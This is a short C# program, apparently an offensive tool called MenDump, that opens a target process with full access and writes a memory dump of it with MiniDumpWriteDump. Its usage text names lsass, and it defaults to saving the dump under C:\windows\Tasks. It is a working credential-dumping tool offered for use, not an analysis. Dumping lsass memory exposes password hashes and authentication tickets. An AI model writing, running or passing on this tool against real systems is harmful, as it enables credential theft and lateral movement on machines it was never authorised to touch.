using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace MenDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType,
        IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); 
        
        static void Main(string[] args)
        {
            
            IntPtr hProc;
            int procId;
            uint PROCESS_ALL_ACCESS = 0x001F0FFF;
            string appName = System.AppDomain.CurrentDomain.FriendlyName;

            if (args.Length == 0)
            {
                Console.WriteLine($"Usage: {appName} lsass [PATH_TO_SAVE_DUMP_FILE]");
                Console.WriteLine($"Example: {appName} lsass C:\\lsass.dmp");
                return;
            }

            string targetProc = args[0];
            string dumpFileName = args[1] != string.Empty ? args[1] : $"C:\\windows\\Tasks\\{targetProc}.dmp";
            
            try
            {
                procId = (Process.GetProcessesByName(targetProc)[0]).Id;
                hProc = OpenProcess(PROCESS_ALL_ACCESS, false, procId);
            }
            catch (Exception e)
            {
                Console.WriteLine($"Couldnt get handle on {targetProc}, Error is:\n\n" +
                    $" {e}");
                return;
            }

                        
            FileStream file = new FileStream(dumpFileName, FileMode.Create);

            /* using file.SafeFileHandle.DangerousGetHandle() to convert the file to a C compatible file handle*/
            bool dumped = MiniDumpWriteDump(hProc, procId, file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            
            file.Close();

            if (dumped) Console.WriteLine($"{targetProc} succesfully dumped to {dumpFileName}");
            else Console.WriteLine("Failed to dump and write");
        }
    }
}
